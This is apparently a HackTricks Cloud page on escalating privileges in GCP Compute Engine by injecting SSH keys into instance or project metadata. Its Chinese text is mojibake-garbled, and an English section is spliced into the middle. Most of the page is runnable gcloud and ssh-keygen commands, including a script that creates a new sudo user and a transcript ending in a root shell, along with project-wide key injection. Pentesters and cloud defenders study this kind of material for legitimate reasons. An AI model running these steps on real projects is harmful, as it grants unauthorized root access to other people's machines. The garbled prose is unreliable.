# GCP - æ·»åŠ è‡ªå®šä¹‰SSHå…ƒæ•°æ®

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆçš„HackTricksï¼Œè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ä¿®æ”¹å…ƒæ•°æ® <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

å¦‚æœæ‚¨å¯ä»¥**ä¿®æ”¹å®ä¾‹çš„å…ƒæ•°æ®**ï¼Œåˆ™æœ‰å¤šç§æ–¹æ³•å¯ä»¥åœ¨æœ¬åœ°æå‡ç‰¹æƒã€‚ä»¥ä¸‹æ˜¯å¯èƒ½å¯¼è‡´å…·æœ‰æ­¤æƒé™çš„æœåŠ¡å¸æˆ·çš„å‡ ç§æƒ…å†µï¼š

_**é»˜è®¤æœåŠ¡å¸æˆ·**_\
å¦‚æœæœåŠ¡å¸æˆ·è®¿é—®**èŒƒå›´**è®¾ç½®ä¸º**å®Œå…¨è®¿é—®**ï¼Œæˆ–è€…è‡³å°‘æ˜ç¡®å…è®¸**è®¿é—®è®¡ç®—API**ï¼Œåˆ™æ­¤é…ç½®å®¹æ˜“å—åˆ°ææƒæ”»å‡»ã€‚**é»˜è®¤**çš„**èŒƒå›´**æ˜¯**ä¸å®¹æ˜“å—åˆ°æ”»å‡»**çš„ã€‚

_**è‡ªå®šä¹‰æœåŠ¡å¸æˆ·**_\
ä½¿ç”¨è‡ªå®šä¹‰æœåŠ¡å¸æˆ·æ—¶ï¼Œéœ€è¦ä»¥ä¸‹IAMæƒé™ä¹‹ä¸€æ‰èƒ½æå‡ç‰¹æƒï¼š

* `compute.instances.setMetadata`ï¼ˆå½±å“å•ä¸ªå®ä¾‹ï¼‰
* `compute.projects.setCommonInstanceMetadata`ï¼ˆå½±å“é¡¹ç›®ä¸­çš„æ‰€æœ‰å®ä¾‹ï¼‰

å°½ç®¡Google [å»ºè®®](https://cloud.google.com/compute/docs/access/service-accounts#associating\_a\_service\_account\_to\_an\_instance)ä¸è¦ä¸ºè‡ªå®šä¹‰æœåŠ¡å¸æˆ·ä½¿ç”¨è®¿é—®èŒƒå›´ï¼Œä½†ä»ç„¶å¯ä»¥è¿™æ ·åšã€‚æ‚¨éœ€è¦ä»¥ä¸‹**è®¿é—®èŒƒå›´**ä¹‹ä¸€ï¼š

* `https://www.googleapis.com/auth/compute`
* `https://www.googleapis.com/auth/cloud-platform`

### **å‘è‡ªå®šä¹‰å…ƒæ•°æ®æ·»åŠ SSHå¯†é’¥**

åœ¨GCPä¸Šï¼Œ**Linux**ç³»ç»Ÿé€šå¸¸ä¼šè¿è¡Œ[Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)è„šæœ¬ã€‚å…¶ä¸­ä¹‹ä¸€æ˜¯[accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ï¼Œå®ƒä¼š**å®šæœŸæŸ¥è¯¢**å®ä¾‹å…ƒæ•°æ®ç«¯ç‚¹ä»¥è·å–**æˆæƒçš„SSHå…¬é’¥çš„æ›´æ”¹**ã€‚

**å¦‚æœé‡åˆ°æ–°çš„å…¬é’¥**ï¼Œå®ƒå°†è¢«å¤„ç†å¹¶**æ·»åŠ åˆ°æœ¬åœ°æœºå™¨**ã€‚æ ¹æ®å¯†é’¥çš„æ ¼å¼ï¼Œå®ƒå°†è¢«æ·»åŠ åˆ°ç°æœ‰ç”¨æˆ·çš„`~/.ssh/authorized_keys`æ–‡ä»¶ä¸­ï¼Œæˆ–è€…å°†åˆ›å»ºä¸€ä¸ªå…·æœ‰`sudo`æƒé™çš„æ–°ç”¨æˆ·ã€‚

å› æ­¤ï¼Œå¦‚æœæ‚¨å¯ä»¥ä½¿ç”¨æ‚¨çš„æœåŠ¡å¸æˆ·ä¿®æ”¹è‡ªå®šä¹‰å®ä¾‹å…ƒæ•°æ®ï¼Œæ‚¨å¯ä»¥é€šè¿‡è·å¾—ç‰¹æƒå¸æˆ·çš„SSHæƒé™æ¥åœ¨æœ¬åœ°ç³»ç»Ÿä¸Šæå‡ä¸ºrootã€‚å¦‚æœæ‚¨å¯ä»¥ä¿®æ”¹**è‡ªå®šä¹‰é¡¹ç›®å…ƒæ•°æ®**ï¼Œåˆ™å¯ä»¥åœ¨å½“å‰GCPé¡¹ç›®ä¸­è¿è¡Œaccounts daemonçš„**ä»»ä½•ç³»ç»Ÿä¸Šæå‡**ä¸ºrootã€‚

### **å‘ç°æœ‰ç‰¹æƒç”¨æˆ·æ·»åŠ SSHå¯†é’¥**

è®©æˆ‘ä»¬é¦–å…ˆå°†æˆ‘ä»¬è‡ªå·±çš„å¯†é’¥æ·»åŠ åˆ°ç°æœ‰å¸æˆ·ä¸­ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šäº§ç”Ÿæœ€å°çš„å™ªéŸ³ã€‚

**æ£€æŸ¥å®ä¾‹æ˜¯å¦å­˜åœ¨SSHå¯†é’¥**ã€‚é€‰æ‹©å…¶ä¸­ä¸€ä¸ªç”¨æˆ·ï¼Œå› ä¸ºä»–ä»¬å¾ˆå¯èƒ½å…·æœ‰sudoæƒé™ã€‚
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
### Add Custom SSH Metadata

To escalate privileges in GCP Compute Engine instances, you can add custom SSH metadata to gain unauthorized access.

1. Identify the target instance by using the `gcloud` command:
   ```
   gcloud compute instances list
   ```

2. Retrieve the SSH key associated with the target instance:
   ```
   gcloud compute instances describe [INSTANCE_NAME] --format="get(metadata.items.ssh-keys)"
   ```

3. Create a new SSH key pair:
   ```
   ssh-keygen -t rsa -f [KEY_FILENAME]
   ```

4. Add the public key to the target instance's metadata:
   ```
   gcloud compute instances add-metadata [INSTANCE_NAME] --metadata="ssh-keys=[USERNAME]:$(cat [KEY_FILENAME].pub)"
   ```

5. SSH into the target instance using the new SSH key:
   ```
   ssh -i [KEY_FILENAME] [USERNAME]@[INSTANCE_IP]
   ```

By adding custom SSH metadata, you can gain unauthorized access to GCP Compute Engine instances and escalate your privileges.
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
è¯·æ³¨æ„å…¬é’¥çš„**ç•¥å¾®å¥‡æ€ªçš„æ ¼å¼** - ç”¨æˆ·ååœ¨**å¼€å¤´**ï¼ˆåè·Ÿå†’å·ï¼‰ï¼Œç„¶åå†æ¬¡å‡ºç°åœ¨**ç»“å°¾**ã€‚æˆ‘ä»¬éœ€è¦åŒ¹é…è¿™ä¸ªæ ¼å¼ã€‚ä¸æ­£å¸¸çš„SSHå¯†é’¥æ“ä½œä¸åŒï¼Œç”¨æˆ·åç»å¯¹é‡è¦ï¼

å°†å¸¦æœ‰ç”¨æˆ·åå’Œå¯†é’¥çš„è¡Œä¿å­˜åœ¨åä¸º`meta.txt`çš„æ–°æ–‡æœ¬æ–‡ä»¶ä¸­ã€‚

å‡è®¾æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä¸Šé¢æåˆ°çš„ç”¨æˆ·`alice`ã€‚æˆ‘ä»¬å°†åƒè¿™æ ·**ç”Ÿæˆä¸€ä¸ªæ–°çš„å¯†é’¥**ï¼š
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
å°†æ‚¨çš„æ–°å…¬é’¥æ·»åŠ åˆ°æ–‡ä»¶`meta.txt`ä¸­ï¼Œæ¨¡ä»¿ä»¥ä¸‹æ ¼å¼ï¼š
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
ç°åœ¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤**é‡æ–°ç¼–å†™å®ä¾‹çš„SSHå¯†é’¥å…ƒæ•°æ®**ï¼š
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
æ‚¨å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤**ä»¥`alice`çš„èº«ä»½è®¿é—®shell**ï¼š
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **åˆ›å»ºä¸€ä¸ªæ–°çš„ç‰¹æƒç”¨æˆ·å¹¶æ·»åŠ SSHå¯†é’¥**

æŒ‰ç…§ä¸Šè¿°æ­¥éª¤åå‘ç°æ²¡æœ‰ç°æœ‰çš„å¯†é’¥ï¼Ÿåœ¨`/etc/passwd`ä¸­æ²¡æœ‰å…¶ä»–æœ‰è¶£çš„ç›®æ ‡ï¼Ÿ

ä½ å¯ä»¥**æŒ‰ç…§ç›¸åŒçš„è¿‡ç¨‹**ï¼Œåªæ˜¯**ç¼–é€ ä¸€ä¸ªæ–°çš„ç”¨æˆ·å**ã€‚è¿™ä¸ªç”¨æˆ·å°†ä¼šè¢«è‡ªåŠ¨åˆ›å»ºå¹¶è¢«èµ‹äºˆ`sudo`æƒé™ã€‚è„šæœ¬åŒ–çš„è¿‡ç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### é¡¹ç›®çº§åˆ«çš„SSHå¯†é’¥ <a href="#sshing-around" id="sshing-around"></a>

æ ¹æ®å‰ä¸€èŠ‚ä¸­æåˆ°çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥å°è¯•å…¥ä¾µæ›´å¤šçš„è™šæ‹Ÿæœºã€‚

æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥æ‰©å±•è¿™äº›å†…å®¹ï¼Œé€šè¿‡[**åœ¨é¡¹ç›®çº§åˆ«åº”ç”¨SSHå¯†é’¥**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide)ï¼Œæˆäºˆæ‚¨å¯¹æœªæ˜ç¡®é€‰æ‹©â€œé˜»æ­¢é¡¹ç›®çº§åˆ«SSHå¯†é’¥â€é€‰é¡¹çš„ä»»ä½•å®ä¾‹è¿›è¡ŒSSHçš„æƒé™ï¼Œä»è€Œè¿›å…¥ç‰¹æƒè´¦æˆ·ã€‚
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
å¦‚æœä½ éå¸¸å¤§èƒ†ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥è¾“å…¥`gcloud compute ssh [INSTANCE]`æ¥ä½¿ç”¨ä½ å½“å‰çš„ç”¨æˆ·åç™»å½•å…¶ä»–ä¸»æœºã€‚

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœä½ æƒ³çœ‹åˆ°ä½ çš„**å…¬å¸åœ¨ HackTricks ä¸­è¢«å®£ä¼ **ï¼Œæˆ–è€…å¦‚æœä½ æƒ³è®¿é—®**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å¾—[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
